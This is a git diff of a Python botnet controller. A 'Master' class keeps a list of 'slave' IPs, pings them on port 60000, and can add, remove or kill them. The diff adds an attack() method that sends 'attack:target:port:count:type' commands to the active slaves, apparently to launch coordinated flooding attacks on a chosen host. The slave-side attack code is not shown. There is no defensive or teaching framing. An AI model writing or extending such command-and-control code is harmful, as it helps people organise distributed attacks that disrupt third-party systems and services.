@@ -49,68 +49,40 @@ class Server :
             finally :
                 print(Log("Connection with {} terminated".format(addr)))
 
-
-class ServerFarm :
-    def __init__(self) :
-        self.created = time.ctime()
-    def create(self,port) :
-        server = Server(('0.0.0.0',port))
-        server.start()
-    def start(self,port) :
-        th = Thread(target=self.create,args=(port,))
-        th.start()
-    def startrange(self,port_start,port_end) :
-        for port in range(port_start,port_end) :
-            th = Thread(target=self.create,args=(port,))
-            th.start()
-
-
-class Client :
-    def __init__(self,ip='0.0.0.0',port=8000) :
-        addr = (ip,port)
-        self.addr = addr 
-        self.cl = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        self.ReadBuffer = 8192
-    def start(self) :
-        print(self.addr)
-        self.cl.connect(self.addr) 
-        self.handle_connected()
-    def handle_connected(self) :
-        """
-        To Be Overloaded
-        In The Derived Class
-        """
-        print(Log("Connection Was Made"))
-        self.cl.close()
-
 class Master :
     def __init__(self,slaves = []) :
         print(Log("Master Initialization Started"))
         if len(slaves) > 255 :
             raise Exception("Master Cannot Handle More Than 255 Slaves Currently")
+        # List of Slave IPs
         self.slaves = slaves
-        self.socks = []
+
+        # List of Active Slaves
         self.up = []
+
+        # Port of bot slaves
         self.bPort = 60000
+
+        # Read Buffer Size
         self.ReadBuffer = 4096
-        print(Log("Creating Slave Connections"))
-        for slave in slaves :
-            self.socks.append(socket.socket(socket.AF_INET,socket.SOCK_STREAM))
-        print(Log("Master Online"))
+
         print(Log("Checking Slaves"))
         self.ping()
+        print(Log("Master Online"))
 
     def upCheck(self,sock,slave) :
+        '''
+        Function To Send Pingcode to Slave
+        '''
         port = self.bPort
         try :
             # print(Log(f"Trying To Connect To {slave}"))
             sock.settimeout(3)
             sock.connect((slave,port))
+            sock.send("ping".encode())
             print(Log(f"{slave} is up"))
             self.up.append(slave)
-            sock.send("ping".encode())
             sock.close()
-            self.socks[self.slaves.index(slave)] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         except socket.timeout:
             # print(Log(f"{slave} is down"))
             pass
@@ -118,51 +90,84 @@ class Master :
             print(Log(f"Error {slave} {port} {e}"))
             
     def ping(self) :
+        '''
+        Function To Check Slaves Which are Active
+        '''
         self.up = []
         port = self.bPort
         threads = []
-        for i in range(len(self.socks)) :
-            sock = self.socks[i]
+        for i in range(len(self.slaves)) :
+            sock = self.getSocket()
             slave = self.slaves[i]
             t = Thread(target=self.upCheck,args=(sock,slave,))
             t.start()
             threads.append(t)
         for thread in threads :
             thread.join()
-    
-    def kill(self,sock,slave) :
-        port = self.bPort
-        try :
-            print(Log(f"Connecting {slave}"))
-            sock.settimeout(3)
-            sock.connect((slave,port))
-            print(Log(f"Killing {slave}"))
-            sock.send("kill".encode())
-            sock.send("kill".encode())
-            sock.close()
-            self.socks[self.slaves.index(slave)] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        except socket.timeout:
-            pass
-        except Exception as e :
-            print(Log(f"Error {slave} {port} {e}"))
 
     def killSlaves(self) :
+        '''
+        Function to Terminate Slaves
+        '''
         port = self.bPort
         print(self.up)
         threads = []
         for slave in self.up :
-            sock = self.socks[self.slaves.index(slave)]
-            t = Thread(target=self.kill,args=(sock,slave,))
+            sock = self.getSocket()
+            t = Thread(target=self.send,args=(sock,slave,'kill',))
             t.start()
             threads.append(t)
         for thread in threads :
             thread.join()
+        self.up = []
+    
+    def addSlave(self,slave) :
+        '''
+        Function to Add Slave
+        '''
+        self.slaves.append(slave)
+        self.ping()
 
-    def updateSlaves(self,slaves) :
-        self.slaves = slaves
-        for sock in self.socks :
-            del sock
-        del self.socks 
-        self.socks = []
-        for slave in slaves :
-            self.socks.append(socket.socket(socket.AF_INET,socket.SOCK_STREAM))
+    def removeSlave(self,slave) :
+        '''
+        Function to Remove Slave
+        '''
+        if slave in self.slaves :
+            self.slaves.remove(slave)
+            self.ping()
+        else :
+            print(Log("IP not a slave"))
+    
+    def send(self,sock,slave,message) :
+        '''
+        Function to send command To Slave
+        '''
+        port = self.bPort
+        try :
+            sock.settimeout(3)
+            sock.connect((slave,port))
+            sock.send(message.encode())
+            sock.close()
+        except socket.timeout:
+            pass
+        except Exception as e :
+            print(Log(f"Error {slave} {port} {message} : {e}"))
+    
+    def attack(self,target,port,count,aType,slaves) :
+        '''
+        Function to start Attack
+        '''
+        threads = []
+        for slave in self.up[:slaves] :
+            sock = self.getSocket()
+            t = Thread(target=self.send,args=(sock,slave,f'attack:{target}:{port}:{count}:{aType}'))
+            t.start()
+            threads.append(t)
+        for thread in threads :
+            thread.join()
+        
+    def getSocket(self) :
+        '''
+        Function to create socket
+        '''
+        return socket.socket(socket.AF_INET,socket.SOCK_STREAM)
